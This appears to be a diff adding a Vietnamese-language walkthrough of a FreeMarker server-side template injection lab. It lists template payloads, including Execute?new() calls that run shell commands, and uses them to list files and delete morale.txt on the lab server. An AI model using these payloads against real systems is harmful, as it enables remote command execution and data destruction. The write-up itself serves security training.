@@ -4,6 +4,7 @@
 * [Lab 2: Basic server-side template injection (code context)](#lab-2-basic-server-side-template-injection-code-context)
 * [Lab 3: Server-side template injection using documentation](#lab-3-server-side-template-injection-using-documentation)
 
+
 ## Lab 1: Basic server-side template injection
 
 ```
@@ -111,3 +112,37 @@ You can log in to your own account using the following credentials:
 content-manager:C0nt3ntM4n4g3r
 
 ```
+Bài này chứa SSTI ở phần **Edit template**, để ý khi edit template thì các giá trị được hiển thị thông qua ${}, thử truyền ${abcd} để xem có báo lỗi gì kh:
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_10.jpg)
+
+
+Hiển thị đây là freeMaker template trong java. 
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_01.jpg)
+
+
+Vậy thì tấn công thôi, sử dụng 1 số payload sau để tấn công:
+
+```
+{{7*7}} = {{7*7}}
+${7*7} = 49
+#{7*7} = 49 -- (legacy)
+${7*'7'} Nothing
+${foobar}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('
+
+```
+Ở dây dùng **${"freemarker.template.utility.Execute"?new()("ls")}** để xem đường file và folder trong thư mục:
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_05.jpg)
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_06.jpg)
+
+Hiển thị file morale.txt, đến đây thì xóa file morale.txt thôi: **${"freemarker.template.utility.Execute"?new()("rm morale.txt")**. Vậy là xong bài lab.
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_03.jpg)
